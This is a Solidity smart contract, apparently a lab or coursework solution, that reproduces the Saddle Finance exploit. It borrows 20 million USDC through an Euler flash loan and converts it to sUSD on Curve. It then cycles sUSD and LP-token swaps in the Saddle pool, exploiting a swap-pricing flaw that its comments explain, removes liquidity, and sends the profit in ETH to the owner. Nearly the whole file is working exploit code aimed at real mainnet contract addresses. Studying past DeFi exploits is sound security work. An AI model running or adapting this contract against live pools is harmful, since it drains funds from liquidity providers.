//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.7;


import "hardhat/console.sol";
import "./Helper.sol";


contract AttackOperator {

    IV2WsapRouter constant SWOPPER_USDC_ETH = IV2WsapRouter(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    IEuler private constant EURLER = IEuler(0x07df2ad9878F8797B4055230bbAE5C808b8259b3);
    ICurve private constant sUSD_CURVE_POOL = ICurve(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
    ISaddle private constant SADDLE_POOL = ISaddle(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491);
    ILiquid private constant LIQUID_MANAGER = ILiquid(0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7);

    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant sUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant SADDLE_LP_USD = IERC20(0x5f86558387293b6009d7896A61fcc86C17808D62);

    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);



    address payable owner;


    // ----------------------FUNCTIONS------------------------------

    constructor() {
        owner = payable (msg.sender);
    }

    receive() external payable {}




    // some helper function, it is totally fine if you can finish the lab without using these function
    // https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol
    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    // safe mul is not necessary since https://docs.soliditylang.org/en/v0.8.9/080-breaking-changes.html
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // some helper function, it is totally fine if you can finish the lab without using these function
    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    // safe mul is not necessary since https://docs.soliditylang.org/en/v0.8.9/080-breaking-changes.html
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    // required by the testing script, entry for your liquidation call
    function operate() external {


        // 1. call flash swap to exploit Saddle
        bytes memory emptyBytes;
        EURLER.flashLoan(address(this), address(USDC), 20_000_000e6, emptyBytes);

        // 2. convert the profit into ETH
        uint256 usdcProfit = USDC.balanceOf(address(this));

        console.log("USDC Profit (K$):", usdcProfit / 1e6 / 1e3);


        USDC.approve(address(SWOPPER_USDC_ETH), usdcProfit);
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        SWOPPER_USDC_ETH.swapExactTokensForTokens(usdcProfit, 0, path, address(this));


        // 3. transfer profit back to owner
        uint256 profit = WETH.balanceOf(address(this));
        WETH.withdraw(profit);

        owner.transfer(profit);
    }


    function onFlashLoan(address, address, uint256 usdcAmount, uint256 fee, bytes calldata) external returns (bytes32){


        // Exchange USDC to sUSD
        USDC.approve(address(sUSD_CURVE_POOL), usdcAmount);
        sUSD_CURVE_POOL.exchange(1, 3, usdcAmount, 0);
        uint256 susdBalance = sUSD.balanceOf(address(this));

        // Exploit Saddle

        uint susd = crossSwapInSaddle(18_000_000e18);

        removeLiquidity(7_000_000e18);

        crossSwapInSaddle(10_000_000e18);

        removeLiquidity(1_500_000e18);

        crossSwapInSaddle(7_000_000e18);

        removeLiquidity(300_000e18);

        crossSwapInSaddle(1_800_000e18);

        removeLiquidity(200_000e18);

        crossSwapInSaddle(1_370_000e18);

        removeLiquidity(100_000e18);

        crossSwapInSaddle(720_000e18);




        // COLLECT MONEY

        // Exchange sUSD to USDC
        susdBalance = sUSD.balanceOf(address(this));
        sUSD.approve(address(sUSD_CURVE_POOL), susdBalance);
        sUSD_CURVE_POOL.exchange(3, 1, susdBalance, 0);

        // Exchange USDT, DAI to USDC
        uint256 daiBalance = DAI.balanceOf(address(this));
        if (daiBalance > 0) {
            DAI.approve(address(sUSD_CURVE_POOL), daiBalance);
            sUSD_CURVE_POOL.exchange(0, 1, daiBalance, 0);
        }


        uint256 usdtBalance = USDT.balanceOf(address(this));
        if (usdtBalance > 0) {
            USDT.approve(address(sUSD_CURVE_POOL), usdtBalance);
            sUSD_CURVE_POOL.exchange(2, 1, usdtBalance, 0);
        }




        uint256 usdcFinalBalance = USDC.balanceOf(address(this));

        //Repay Loan

        assert(usdcFinalBalance > usdcAmount); // Did not earn enough to repay the loan

        USDC.approve(msg.sender, usdcAmount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function logPrintAmount(string memory text, uint256 number, uint256 precision) internal {
//
//        string memory toPrint;
//        if (number % precision < 10) {
//            toPrint = string("00") + string(number % precision);
//        } else if (number % precision < 100) {
//            toPrint = string("0") + string(number % precision);
//        } else {
//            toPrint = string(number % precision);
//        }

        console.log(text, number / precision, number % precision);
    }

    function crossSwapInSaddle(uint256 susdAmount) internal returns (uint256 susdNewBalance) {
        uint256 susdBalance = sUSD.balanceOf(address(this));

        console.log("------- STARTED SWAP ITERATION  -------");

        logPrintAmount("My current sUSD balance: %s.%s M sUSD", susdBalance / 1e18 / 1e3, 1e3);
        logPrintAmount("Swapping %s.%s M sUSD...", susdAmount / 1e18 / 1e3, 1e3);
        logPrintAmount("Total sUSD in the Pool before sUSD=>LP Swap: %s.%s M sUSD", SADDLE_POOL.getTokenBalance(0) / 1e18 / 1e3, 1e3);
        logPrintAmount("Total LP Tokens in the Pool before sUSD=>LP Swap: %s.%s M LP Token", SADDLE_POOL.getTokenBalance(1) / 1e18 / 1e3, 1e3);
        console.log("Doing a sUSD=>LP Swap...");

        assert(susdBalance >= susdAmount); // Must have more sUSD than expect to swap

        // Swap sUSD for SADDLE_LP_USD
        // This exploits the price calculation of SADDLE_LP_USD swap
        // Which does nit factor the "fee" rewards after the swap when calculating the exchange rate
        // Thus giving more SADDLE_LP_USD then it should
        sUSD.approve(address(SADDLE_POOL), susdBalance);
        SADDLE_POOL.swap(0, 1, susdAmount, 0, block.timestamp);

        uint256 lpBalance = SADDLE_LP_USD.balanceOf(address(this));

        logPrintAmount("My current LP Token balance: %s.%s M LP Tokens", lpBalance / 1e18 / 1e3, 1e3);

        logPrintAmount("Total sUSD in the Pool before LP=>sUSD Swap: %s.%s M sUSD", SADDLE_POOL.getTokenBalance(0) / 1e18 / 1e3, 1e3);
        logPrintAmount("Total LP Tokens in the Pool before LP=>sUSD Swap: %s.%s M LP Token", SADDLE_POOL.getTokenBalance(1) / 1e18 / 1e3, 1e3);
        console.log("Doing a LP=>sUSD Swap...");

        // Swap back SADDLE_LP_USD for more sUSD than originally
        SADDLE_LP_USD.approve(address(SADDLE_POOL), lpBalance);
        SADDLE_POOL.swap(1, 0, lpBalance, 0, block.timestamp);

        susdNewBalance = sUSD.balanceOf(address(this));


        logPrintAmount("My new sUSD balance: %s.%s M sUSD", susdBalance / 1e18 / 1e3, 1e3);
        logPrintAmount("Swapping %s.%s M sUSD...", susdAmount / 1e18 / 1e3, 1e3);
        logPrintAmount("Total sUSD in the Pool after swaps: %s.%s M sUSD", SADDLE_POOL.getTokenBalance(0) / 1e18 / 1e3, 1e3);
        logPrintAmount("Total LP Tokens in the Pool after swaps: %s.%s M LP Token", SADDLE_POOL.getTokenBalance(1) / 1e18 / 1e3, 1e3);
        console.log("------- FINISHED SWAP ITERATION  -------\n\n\n");


        assert(susdNewBalance > susdBalance); // No profit made otherwise

        return susdNewBalance;
    }


    function removeLiquidity(uint256 susdAmount) internal returns ( uint256[3] memory stableBalances) {

        uint256 susdBalance = sUSD.balanceOf(address(this));

        console.log("------- STARTED LIQUIDITY REMOVAL ITERATION -------");

        logPrintAmount("My current sUSD balance: %s.%s M sUSD", susdBalance / 1e18 / 1e3, 1e3);
        logPrintAmount("Total sUSD in the Pool before removing liquidity: %s.%s M sUSD", SADDLE_POOL.getTokenBalance(0) / 1e18 / 1e3, 1e3);
        logPrintAmount("Total LP Tokens in the Pool before removing liquidity: %s.%s M LP Token", SADDLE_POOL.getTokenBalance(1) / 1e18 / 1e3, 1e3);
        logPrintAmount("Removing %s.%s M sUSD...", susdAmount / 1e18 / 1e3, 1e3);


        assert(susdBalance >= susdAmount);


        sUSD.approve(address(SADDLE_POOL), susdBalance);
        SADDLE_POOL.swap(0, 1, susdAmount, 0, block.timestamp);

        uint256 lpBalance = SADDLE_LP_USD.balanceOf(address(this));

        logPrintAmount("My current LP Token balance: %s.%s M LP Tokens", lpBalance / 1e18 / 1e3, 1e3);

        SADDLE_LP_USD.approve(address(LIQUID_MANAGER), lpBalance);
        uint256[] memory receivedBalances = LIQUID_MANAGER.removeLiquidity(lpBalance, new uint256[](3), block.timestamp);

        logPrintAmount("Total sUSD in the Pool after removing liquidity: %s.%s M sUSD", SADDLE_POOL.getTokenBalance(0) / 1e18 / 1e3, 1e3);
        logPrintAmount("Total LP Tokens in the Pool after removing liquidity: %s.%s M LP Token", SADDLE_POOL.getTokenBalance(1) / 1e18 / 1e3, 1e3);

        logPrintAmount("Received %s.%s M DAI", receivedBalances[0] / 1e18 / 1e3, 1e3);
        logPrintAmount("Received %s.%s M USDC", receivedBalances[1] / 1e6 / 1e3, 1e3);
        logPrintAmount("Received %s.%s M USDT", receivedBalances[2] / 1e6 / 1e3, 1e3);

        stableBalances = [receivedBalances[0], receivedBalances[1], receivedBalances[2]];

        console.log("------- FINISHED  LIQUIDITY REMOVAL ITERATION  -------\n\n\n");

        return stableBalances;

    }
}
